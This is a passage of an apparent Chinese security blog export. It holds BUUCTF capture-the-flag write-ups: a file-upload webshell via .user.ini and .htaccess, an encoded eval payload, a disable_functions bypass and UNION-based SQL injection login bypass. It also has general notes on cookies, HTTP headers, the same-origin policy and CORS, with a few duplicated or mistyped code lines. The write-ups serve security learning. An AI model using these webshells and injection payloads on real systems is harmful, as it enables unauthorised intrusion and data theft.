\nauto_prepend_file=haha.gif\n\n上传.user.ini\n\n这个时候haha.gif就已经包含在index.php，可以访问\nhttp://9c7a4b64-1c49-4ee4-a146-dc6763b5ce1c.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php\n\n能看到GIF98a?\n然后也可以用hackbar，post上传命令，如图中的phpinfo()\n\ncmd=var_dump(scandir(\"/\"));//看看根目录，找到flag\n\n\ncmd=var_dump(file_get_contents(\"/flag\"));//读取flag文件\n\n\n\n当然用蚁剑最简单，连接也成功\n\n可以看到index.php文件也在上传的目录下，也就是.user.ini的同一个目录下，所以才可以成功包含\n\n在根目录发现了flag，打开即可得到flag\n\n但我发现根目录一个clean.sh文件，这是一个定时清空linux服务器上缓存的文件脚本，上传的文件会被定时删除\n\n这是一分钟左右后，靶场环境还在但是无法访问了，所以要快点拿取flag\n\n这里本来想删掉clean.sh，发现没权限，无法执行，sudo也不行，那就只能速战速决了\n\n根目录得到flag\n10.[GXYCTF2019]BabyUpload1)题目描述无\n2)wp这道题不难，但是开始不清楚还是不知道过滤了什么，\n这道题介绍几个点就可以了\n第一个是过滤了后缀名含ph\n第二也是关键的，它只允许上传content-type: image/jpeg，png和gif都不可以\n第三点就是它过滤了文件内容里含&lt;?\n所以上传一个jpeg文件，抓包修改内容为非php但包含php的一个脚本，\n&lt;script language=&quot;php&quot;&gt;&lt;script language=&quot;php&quot;&gt;@eval($_POST[\"cmd\"]);\n\n再上传.htaccess文件，解析所有文件为php\n用蚁剑连接jpeg文件，即可\n11.[极客大挑战 2019]RCE ME1)题目描述无\n2)wp先对代码分析\n\nerror_reporting(0);\nif(isset($_GET[&#x27;code&#x27;]))&#123;\n            $code=$_GET[&#x27;code&#x27;];\n                    if(strlen($code)>40)&#123;\n                                        die(\"This is too Long.\");\n                                                &#125;\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123;\n                                        die(\"NO.\");\n                                                &#125;\n                    @eval($code);\n&#125;\nelse&#123;\n            highlight_file(__FILE__);\n&#125;\n\n// ?>\n\n可以看到code被正则匹配，所以字母大小写和数字都不能输入\n这里就学到新东西了\n取反绕过\n取反就是将数字转化为二进制,再把二进制中的1变成0,0变成1\n~是取反符号，\n\n\n结果：\n%9E%8C%8C%9A%8D%8B\n%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6\n\n//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行\n\n然后再赋值\n?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);\n\n//注意后面要有；，代表php代码结束\n//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反\n\n等同于\n\n?code=(assert)(eval($_REQUEST[8]));\n\n(assert)因为是assert是函数，被当作函数执行，于是因为断言(eval($_REQUEST[8]))，所以把eval($_REQUEST[8])当作php执行，于是就可以拿到shell了\n\n\n\n蚁剑连接\nhttp://url?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);\n\n但是发现flag是空的\n\n看了其他大佬的wp才知道，需要蚁剑插件disable_functions，禁止网站的函数，防止其阻止读取flag\n\n再在主页右键\n\n模式选择\n\n然后点击开始\n终端输入\n/readflag\n\n得到flag\n12.[GXYCTF2019]BabySQli1)题目描述无\n2)wp开始是一个登录框\n\n我们随便输入一个账号密码\n账号：admin\n密码：123456\n\n\n报错，看来用户名没错，密码错误\n查看源码看看\n\n发现有一串加密字符，看起来像base\n先用base32\n\n看起来就是base32+base64混合编码，再用base64\n\n\n当然看不出来，直接无脑ciphey，也可以，当然还是需要了解不同编码和加密字符的特点\n\n也可以得到解码结果\n\n由\nselect * from user where username = &#x27;$name&#x27;\n\n可知，sql注入点在Username处，且为单引号闭合\n于是我们尝构造注入\nname=admin&#x27;%20and%201=1#&pw=123456\n\n\n发现有的字符被过滤了，我们可以用fuzz爆破测试看看，也可以一个一个试\n我这里先爆破试试（建议爆破还是慢一些，后面直接太多请求，服务器不发返回包了）\n大概统计一下\nor\n()\n=\n\n所以我们只有先试试联合注入\n由于过滤了or\n所以我们不能使用order by来判断列数，可以用联合注入，利用select的结果来判断\n\n先试试select 1,2\nname=admin&#x27;%20union%20select%201,2#&pw=123456\n\n\n发现报错，列数有问题\n再试试select 1,2,3\nname=admin&#x27;%20union%20select%201,2,3#&pw=123456\n\n\n发现虽然没有报错，但是也没有直接回显\n再试试select 1,2,3,4\n又报错\n\n所以得出列数一共有3列\n根据经验这三列，分别是id,username,password\n我们可以用以下语句进行确认\nname=-1&#x27;%20union%20select%20”admin“,2,3#&pw=123456   \n//把第一位，即1的位置换成用户名admin\n\n\n提示用户名错误，看来用户名不在第一位\nname=-1&#x27;%20union%20select%201,\"admin\",3#&pw=123456\n//把第二位，即2的位置换成用户名admin\n\n\n提示密码错误，看来用户名回显就在第二位\n但是没有回显我们select的数据，可是如果用报错注入和盲注的话，()被过滤了，也不能用\n所以我们只有考虑，怎么才可以登录上去\n首先这是一个sql注入的题目，密码不可能简单的爆破就可以解决\n密码肯定是进行加密，最常见的密码加密就是md5，所以我们利用md()函数把我们的密码加密，再加上我们的用户名一起导入到题目的数据库里，即可完成登录\n注意因为()被过滤，所以只能先把密码进行md5加密，在导入，而不能直接用函数\n\n这里又有一个新的知识点\n在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。【union select】\n在Web-study里写的详细\n下面简单说一下流程\n先把我们的密码123456利用md5加密\n\ne10adc3949ba59abbe56e057f20f883e\n\n然后构造payload\nname=-1&#x27;%20union%20select%201,\"admin\",\"e10adc3949ba59abbe56e057f20f883e\"#&pw=123456\n\n/*\n联合注入的技巧，就是在使用union select时候，后面的数据如果不存在，就会生成一个虚拟的数据\n如上面的\n\n根据上面base编码结果，select * from user where username = &#x27;$name&#x27;\n\n我们利用union select 1,\"admin\",\"e10adc3949ba59abbe56e057f20f883e\"\n\n因为user表里不存在id=1,username=admin,password=e10adc3949ba59abbe56e057f20f883e\n\n所以会生成一个一个数据插入表中\n*/\n/*\n当name参数进行sql注入，把数据插入user表中时\n后面password只要和明文一样，即可登录成功\n*/\n\n\n得到flag\n13.[护网杯 2018]easy_tornado1)题目描述无\n2)wp","slug":"wp-buuctf","date":"2022-06-21T14:06:24.391Z","categories_index":"网络安全学习","tags_index":"靶场","author_index":"Ttoc"},{"id":"8009cc0308ef2b434146ef92878679ee","title":"web基础随记","content":"随便记一下，大都常混淆或者易忘基础知识\n\n\n网站连接重置，用清空缓存和Cookie解决今天在打buuctf靶场的时候遇到一个问题，就是当页面跳转时，会显示连接重置，导致我的sql注入结果不能显示，然后百度了一下，发现可能是浏览器缓存太多导致的，于是我把浏览器的缓存和cookie一同全部清空，然后我再刷新sql 注入那道题的界面，解决了，没有再显示连接重置，也显示了我的注入结果，我正要交flag的时候，然后，我发现…..，我的buuctf账号下线，我的csdn账号也下线了\ncookie的作用和重要性就出来了，从这个事情看出，cookie是当我们登录网站的主要身份凭证，当我删除cookie后，我无法证明自己身份时，即网站当前浏览器无该账号当前在该网站的cookie时，网站就会强制下线我的账号\n但是，如果我们在登录网站时（没有退出），点击了其他链接导致自己在该浏览器的该网站的cookie外泄，被有心人获取，那么拥有你的cookie的人，就可以登录你的账号，在你登录的网站上进行修改密码，删除文章，甚至可以转账等等\n所以以后登录了一些重要网站时，比如支付宝，淘宝，博客网站时，别随便点击链接，保证自己的信息安全，不要黑客被黑客黑了，那确实有点难为情了\n\n\n\n\n\n\n\n\n\nCookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容\ngit命令使用githack，记录一些命令\n\n随手记录题目头疼的php代码审计第一眼很头疼的php代码审计，但看着却没有什么太大的考点，这里我没有题目，就在本地试试能不能绕过所有的\n \n// code by SEC@USTC \n\necho &#x27;&#x27;; \n\n$URL = $_SERVER[&#x27;REQUEST_URI&#x27;]; \n//echo &#x27;URL: &#x27;.$URL.&#x27;&#x27;; \n$flag = \"CTF&#123;???&#125;\"; \n\n$code = str_replace($flag, &#x27;CTF&#123;???&#125;&#x27;, file_get_contents(&#x27;./index.php&#x27;)); \n$stop = 0; \n\n\nif($flag && strpos($URL, &#x27;./&#x27;) !== FALSE)&#123; \n    $flag = \"\"; \n    $stop = 1;        //Pass \n&#125; \n\n\nif($flag && strpos($URL, &#x27;\\\\&#x27;) !== FALSE)&#123; \n    $flag = \"\"; \n    $stop = 2;        //Pass \n&#125; \n\n$matches = array(); \npreg_match(&#x27;/^([0-9a-z\\/.]+)$/&#x27;, $URL, $matches); \nif($flag && empty($matches) || $matches[1] != $URL)&#123; \n    $flag = \"\"; \n    $stop = 3;        //Pass \n&#125; \n\n\nif($flag && strpos($URL, &#x27;//&#x27;) !== FALSE)&#123; \n    $flag = \"\"; \n    $stop = 4;        //Pass \n&#125; \n\n\nif($flag && substr($URL, -10) !== &#x27;/index.php&#x27;)&#123; \n    $flag = \"\"; \n    $stop = 5;        //Pass \n&#125; \n\n\nif($flag && strpos($URL, &#x27;p.&#x27;) !== FALSE)&#123; \n    $flag = \"\"; \n    $stop = 6;        //Pass \n&#125; \n\n\nif($flag && $URL == &#x27;/fan/index.php&#x27;)&#123; \n    $flag = \"\"; \n    $stop = 7;        //Pass \n&#125; \nif(!$stop) $stop = 8; \n\necho &#x27;Flag: &#x27;.$flag; \necho &#x27;&#x27;; \nfor($i = 1; $i $stop; $i++) \n    $code = str_replace(&#x27;//Pass &#x27;.$i, &#x27;//Pass&#x27;, $code); \nfor(; $i 8; $i++) \n    $code = str_replace(&#x27;//Pass &#x27;.$i, &#x27;//Not Pass&#x27;, $code); \n\n\necho highlight_string($code, TRUE); \n\necho &#x27;&#x27;;\n?>\n\n本地回环\n\n\n\n\n\n\n\n\n本地回环地址（Loop back address），不属于任何一个有类别地址类。它代表设备的本地虚拟接口，所以默认被看作是永远不会宕掉的接口。\n主要作用有两个：一是测试本机的网络配置，能PING通127.0.0.1说明本机的网卡和IP协议安装都没有问题；另一个作用是某些SERVER/CLIENT的应用程序在运行时需调用服务器上的资源，一般要指定SERVER的IP地址，但当该程序要在同一台机器上运行而没有别的SERVER时就可以把SERVER的资源装在本机，SERVER的IP地址设为127.0.0.1同样也可以运行。\n本地回环地址指的是以127开头的地址（127.0.0.1 - 127.255.255.254），通常用127.0.0.1来表示\n但是，使用127.0.0.1/8内的不同地址，就可以在本机上设置侦听相同端口的多个服务器\nclient-ip和X-Forwarded-For和\n\n\n\n\n\n\n\n\n1）client-ip：客户端ip，相较于X-Forwarded-For，它只有一个ip也就是真实ip，当不能伪造XFF头的时候，就可以用client-ip代替，直接指明伪造ip\n2）X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP\n请求头、响应头全部内容HTTP请求头\n\n\n\n\n\n\n\n\nAccept：浏览器可接受的MIME类型。\nAccept-Charset：浏览器可接受的字符集。\nAccept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。\nAccept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。\nAuthorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。\nConnection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。\nContent-Length：表示请求消息正文的长度。\nCookie：这是最重要的请求头信息之一\nFrom：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。\nHost：初始URL中的主机和端口。\nIf-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。\nPragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。\nReferer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。\nUser-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。\nUA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。\nHTTP应答头\n\n\n\n\n\n\n\n\nWeb服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，等等许多其他任务。设置应答头最常用的方法是HttpServletResponse的setHeader，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。\n\n\n\n\n\n\n\n\n\nsetContentType：设置Content-Type头。大多数Servlet都要用到这个方法。\nsetContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。\naddCookie：设置一个Cookie（Servlet API中没有setCookie方法，因为应答往往包含多个Set-Cookie头）。另外，如上节介绍，sendRedirect方法设置状态代码302时也会设置Location头。\nHTTP应答头 说明Allow 服务器支持哪些请求方法（如GET、POST等）。\nContent-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。\nContent-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。\nContent-Type 表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。\nDate 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。\nExpires 应该在什么时候认为文档已经过期，从而不再缓存它？Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。\nLocation 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。\nRefresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过\nsetHeader(\"Refresh\", \"5; URL=http://host/path\")\n\n让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的\n\n\n[注，笔者开始把这段代码复制到该博客时，发现一直在向host/path，跳转，最后查看网络，才发现这里这段代码发挥了作用，并没有当作简单的文本]\n实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV&#x3D;”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。\nServer 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。\nSet-Cookie 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。\nWWW-Authenticate 客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm&#x3D;&quot;executives&quot;“)。注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。\n响应码\n\n\n\n\n\n\n\n\nHTTP状态码的常见类别和含义如下：\n\n1xx（信息性状态码）：表示请求已被接受，需要继续处理。\n2xx（成功状态码）：表示请求已成功被服务器接收、理解、并接受处理。\n3xx（重定向状态码）：表示需要客户端采取进一步的操作才能完成请求。\n4xx（客户端错误状态码）：表示客户端请求错误或无法完成请求。\n5xx（服务器错误状态码）：表示服务器在处理请求时发生错误。\n\n常见的HTTP状态码包括：\n\n200 OK：请求成功。\n302 Found：请求的资源已被临时移动到新的位置。\n400 Bad Request：请求无效或不完整。\n401 Unauthorized：未授权，需要身份验证。\n403 Forbidden：服务器拒绝请求。\n404 Not Found：请求的资源不存在。\n500 Internal Server Error：服务器内部错误。\n503 Service Unavailable：服务器暂时无法处理请求。\n\nsession利用的小思路常见的基本就两种，session文件包含和session反序列化\n原文链接：https://xz.aliyun.com/t/10662\n同源策略作者：laixiangran\n链接：https://juejin.cn/post/6844903681683357710\n来源：稀土掘金\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n含义1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。\n最初，它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页”同源”。所谓”同源”指的是”三个相同”。\n\n\n\n\n\n\n\n\n\n\n协议相同\n域名相同\n端口相同\n\n举例来说，http://www.example.com/dir/page.html这个网址，协议是http://，域名是www.example.com，端口是80（默认端口可以省略）。\n它的同源情况如下\n\n\n\n\n\n\n\n\n\n\nhttp://www.example.com/dir2/other.html：同源\nhttp://example.com/dir/other.html：不同源（域名不同）\nhttp://v2.www.example.com/dir/other.html：不同源（域名不同）\nhttp://www.example.com:81/dir/other.html：不同源（端口不同）\n\n限制范围随着互联网的发展，”同源政策”越来越严格。目前，如果非同源，共有三种行为受到限制。\n\n\n\n\n\n\n\n\n\n（1） Cookie、LocalStorage 和 IndexDB 无法读取。\n（2） DOM 无法获得。\n（3） AJAX 请求不能发送。\n虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面，我将详细介绍，如何规避上面三种限制。\n为什么要有跨域限制因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。\n如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从 DOM 同源策略和 XMLHttpRequest 同源策略来举例说明：\n如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击：\n\n\n\n\n\n\n\n\n\n\n做一个假网站，里面用 iframe 嵌套一个银行网站 http://mybank.com。\n把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。\n这时如果用户输入账号密码，我们的主网站可以跨域访问到 http://mybank.com 的 dom 节点，就可以拿到用户的账户密码了。\n\n如果没有 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：\n\n\n\n\n\n\n\n\n\n\n用户登录了自己的银行页面 http://mybank.com，http://mybank.com 向用户的 cookie 中添加用户标识。\n用户浏览了恶意页面 http://evil.com，执行了页面中的恶意 AJAX 请求代码。\nhttp://evil.com 向 http://mybank.com 发起 AJAX HTTP 请求，请求会默认把 http://mybank.com 对应 cookie 也同时发送过去。\n银行页面从发送的 cookie 中提取用户标识，验证用户无误，response 中返回请求数据。此时数据就泄露了。\n而且由于 Ajax 在后台执行，用户无法感知这一过程。\n\n因此，有了浏览器同源策略，我们才能更安全的上网。\n跨域的解决方法从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。\nCORS（跨域资源共享）\n\n\n\n\n\n\n\n\nCORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。\nCORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。\n整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。\n因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。\n浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。\n只要同时满足以下两大条件，就属于简单请求。\n\n\n\n\n\n\n\n\n\n1.请求方法是以下三种方法之一：\n\nHEAD\nGET\nPOST\n\n2.HTTP的头信息不超出以下几种字段：\n\nAccept\nAccept-Language\nContent-Language\nLast-Event-ID\nContent-Type：只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain\n\n凡是不同时满足上面两个条件，就属于非简单请求。\n浏览器对这两种请求的处理，是不一样的。\n简单请求\n\n\n\n\n\n\n\n\n\n在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：Origin: http://www.laixiangran.cn\n如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：Access-Control-Allow-Origin：http://www.laixiangran.cn\n没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。\n如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 Access-Control-Allow-Credentials: true。\n\n非简单请求浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部：\n\n\n\n\n\n\n\n\n\n\nOrigin：与简单的请求相同。\nAccess-Control-Request-Method: 请求自身使用的方法。\nAccess-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。\n\n例如：\nOrigin: http://www.laixiangran.cn\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: NCZ\n\n发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：\n\n\n\n\n\n\n\n\n\n\nAccess-Control-Allow-Origin：与简单的请求相同。\nAccess-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。\nAccess-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。\nAccess-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。\n\n例如：\n\n\n\n\n\n\n\n\n\nAccess-Control-Allow-Origin: http://www.laixiangran.cnAccess-Control-Allow-Methods: GET, POSTAccess-Control-Allow-Headers: NCZAccess-Control-Max-Age: 1728000\n一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。\n优点\n\n\n\n\n\n\n\n\n\nCORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。\n支持所有类型的 HTTP 请求。\n\n缺点\n\n\n\n\n\n\n\n\n\n存在兼容性问题，特别是 IE10 以下的浏览器。\n第一次发送非简单请求时会多一次请求。\n\nJSONP 跨域\n\n\n\n\n\n\n\n\n由于 script 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。\n直接通过下面的例子来说明 JSONP 实现跨域的流程：\n// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据\nfunction handleResponse(data) &#123;\n    console.log(data);\n&#125;;\n\n// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse\nvar body = document.getElementsByTagName(&#x27;body&#x27;)[0];\nvar script = document.gerElement(&#x27;script&#x27;);\nscript.src = &#x27;http://www.laixiangran.cn/json?callback=handleResponse&#x27;;\nbody.appendChild(script);\n\n// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?callback=handleResponse`，\n// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse(&#123;\"name\": \"laixiangran\"&#125;) 给浏览器\n// 5. 浏览器在接收到 handleResponse(&#123;\"name\": \"laixiangran\"&#125;) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。\n\n优点\n\n\n\n\n\n\n\n\n\n使用简便，没有兼容性问题，目前最流行的一种跨域方法。\n\n缺点\n\n\n\n\n\n\n\n\n\n只支持 GET 请求。\n由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。\n要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。\n\n图像 Ping 跨域\n\n\n\n\n\n\n\n\n由于 img 标签不受浏览器同源策略的影响，允许跨域引用资源。\n因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。\n直接通过下面的例子来说明图像 Ping 实现跨域的流程：\nvar img = new Image()var img = new Image();\n\n// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本\nimg.onload = img.onerror = function() &#123;\n    console.log(\"Done!\");\n&#125;\n\n// 请求数据通过查询字符串形式发送\nimg.src = &#x27;http://www.laixiangran.cn/test?name=laixiangran&#x27;;\n\n优点\n\n\n\n\n\n\n\n\n\n用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。\n\n缺点\n\n\n\n\n\n\n\n\n\n只支持 GET 请求。\n只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。\n\n服务器代理\n\n\n\n\n\n\n\n\n浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所有域的资源再返回给客户端。\n**服务器代理是万能的**。\ndocument.domain 跨域\n\n\n\n\n\n\n\n\n对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。\n比如，\n有一个页面，它的地址是 http://www.laixiangran.cn/a.html，在这个页面里面有一个 iframe，它的 src 是 http://laixiangran.cn/b.html。\n\n\n\n\n\n\n\n\n\n很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。\n这个时候，document.domain 就可以派上用场了，我们只要把 http://www.laixiangran.cn/a.html 和 http://laixiangran.cn/b.html 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。例如：a.b.laixiangran.cn 中某个文档的 document.domain 可以设成 a.b.laixiangran.cn、b.laixiangran.cn 、laixiangran.cn 中的任意一个，但是不可以设成 c.a.b.laixiangran.cn ，因为这是当前域的子域，也不可以设成 baidu.com，因为主域已经不相同了。\n例如，在页面 http://www.laixiangran.cn/a.html 中设置document.domain：\n&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=\"test()\">\nscript>\n    document.domain = &#x27;laixiangran.cn&#x27;; // 设置成主域\n    function test() &#123;\n        console.log(document.getElementById(&#x27;myIframe&#x27;).contentWindow);\n    &#125;\nscript>\n\n在页面 http://laixiangran.cn/b.html 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 laixiangran.cn，但是还是必须显式地设置 document.domain 的值：\n&lt;script&gt;&lt;script&gt;\n    document.domain = &#x27;laixiangran.cn&#x27;; // document.domain 设置成与主页面相同\nscript>\n\n这样，http://www.laixiangran.cn/a.html 就可以通过 js 访问到 http://laixiangran.cn/b.html 中的各种属性和对象了。\nwindow.name 跨域\n\n\n\n\n\n\n\n\nwindow 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 window.name 的，每个页面对 window.name 都有读写的权限，window.name 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。\n通过下面的例子介绍如何通过 window.name 来跨域获取数据的。\n页面 http://www.laixiangran.cn/a.html 的代码：\n&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=\"display: none;\">\nscript>\n    // 2. iframe载入 \"http://laixiangran.cn/b.html 页面后会执行该函数\n    function test() &#123;\n        var iframe = 